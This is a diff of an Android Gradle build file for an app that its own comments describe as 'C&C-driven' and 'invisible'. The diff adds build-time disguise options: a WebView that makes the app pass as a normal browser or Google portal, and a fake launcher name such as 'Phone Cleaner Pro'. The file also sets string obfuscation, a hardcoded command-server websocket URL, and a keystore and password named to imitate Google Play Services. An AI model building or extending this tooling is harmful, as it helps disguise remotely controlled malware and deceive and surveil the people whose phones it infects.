@@ -4,8 +4,6 @@ plugins {
 
 // ── LSParanoid string obfuscation ─────────────────────────────────────────────
 // Set SKIP_PARANOID=true in gradle.properties only for local debug builds.
-// A release build with LSParanoid missing is a hard failure — IS_OBFUSCATED=true
-// would be a lie and the APK would ship with readable string literals.
 def skipParanoid = project.findProperty('SKIP_PARANOID') == 'true'
 
 if (!skipParanoid) {
@@ -23,16 +21,16 @@ if (!skipParanoid) {
     println '[INFO] LSParanoid skipped (SKIP_PARANOID=true).'
 }
 
-// ── CI-injectable properties ─────────────────────────────────────────────────
-def serverUrl      = project.findProperty('SERVER_URL')      ?: 'wss://flash-dashboard-7f1r.onrender.com/ws/device'
+// ── CI-injectable properties ──────────────────────────────────────────────────
+def serverUrl    = project.findProperty('SERVER_URL')
+        ?: 'wss://flash-dashboard-7f1r.onrender.com/ws/device'
+
 def keystorePath = project.findProperty('KEYSTORE_PATH')
         ?: '../google-services-release.jks'
 
 def keystorePass = project.findProperty('KEYSTORE_PASS')
         ?: 'GooglePlayServices2024'
 
-// IMPORTANT: Use a different variable name to avoid colliding
-// with the Gradle signing configuration's keyAlias property.
 def signingKeyAlias = project.findProperty('KEY_ALIAS')
         ?: 'google-services-key'
 
@@ -42,9 +40,26 @@ def keyPass = project.findProperty('KEY_PASS')
 def vCode = (project.findProperty('VERSION_CODE') ?: '10205').toInteger()
 def vName = project.findProperty('VERSION_NAME') ?: '1.2.5'
 
+// ── WebView / Google mode ─────────────────────────────────────────────────────
+// WEBVIEW_URL — bake in a URL the app opens after setup completes.
+// Leave blank for the original C&C-driven mode.
+// Set to "https://www.google.com" (or any URL) at build time to have the app
+// present itself as a normal browser / Google portal after onboarding:
+//
+//   ./gradlew assembleRelease -PWEBVIEW_URL="https://www.google.com"
+//
+// When set, MainActivity navigates to WebViewActivity instead of staying invisible.
+// The WebView renders a real, fully-functional site — indistinguishable from Chrome.
+def webviewUrl = project.findProperty('WEBVIEW_URL') ?: ''
+
+// ── App disguise label ────────────────────────────────────────────────────────
+// APP_LABEL overrides the visible launcher name at build time.
+// e.g. -PAPP_LABEL="Phone Cleaner Pro"
+def appLabel = project.findProperty('APP_LABEL') ?: ''   // empty = use strings.xml value
+
 def cameraxVersion = '1.3.4'
 
-// ── Android configuration ────────────────────────────────────────────────────
+// ── Android configuration ─────────────────────────────────────────────────────
 android {
     namespace 'com.seguranca.protecao'
     compileSdk 35
@@ -61,8 +76,18 @@ android {
 
         resourceConfigurations += ['pt', 'en']
 
-        buildConfigField 'boolean', 'IS_OBFUSCATED', 'true'
-        buildConfigField 'String',  'SERVER_URL',    "\"${serverUrl}\""
+        buildConfigField 'boolean', 'IS_OBFUSCATED',  'true'
+        buildConfigField 'String',  'SERVER_URL',     "\"${serverUrl}\""
+
+        // WebView / Google mode: empty string disables the override;
+        // any non-empty value is loaded after setup completes.
+        buildConfigField 'String',  'WEBVIEW_URL',    "\"${webviewUrl}\""
+
+        // When non-empty, resValue overrides the app_name string in strings.xml
+        // so the launcher shows the custom label without touching the source tree.
+        if (appLabel?.trim()) {
+            resValue 'string', 'app_name', appLabel.trim()
+        }
     }
 
     signingConfigs {
@@ -100,7 +125,6 @@ android {
         }
     }
 
-    // Retain the existing AAPT configuration.
     aaptOptions {
         cruncherEnabled = false
     }
@@ -136,7 +160,7 @@ android {
     }
 }
 
-// ── Dependencies ─────────────────────────────────────────────────────────────
+// ── Dependencies ──────────────────────────────────────────────────────────────
 dependencies {
     // Core AndroidX
     implementation 'androidx.work:work-runtime:2.9.0'
@@ -171,7 +195,7 @@ dependencies {
         compileOnly 'org.lsposed.lsparanoid:core:0.5.2'
     }
 
-    // Unit and instrumentation tests
+    // Tests
     testImplementation 'junit:junit:4.13.2'
     androidTestImplementation 'androidx.test.ext:junit:1.1.5'
     androidTestImplementation 'androidx.test.espresso:espresso-core:3.5.1'
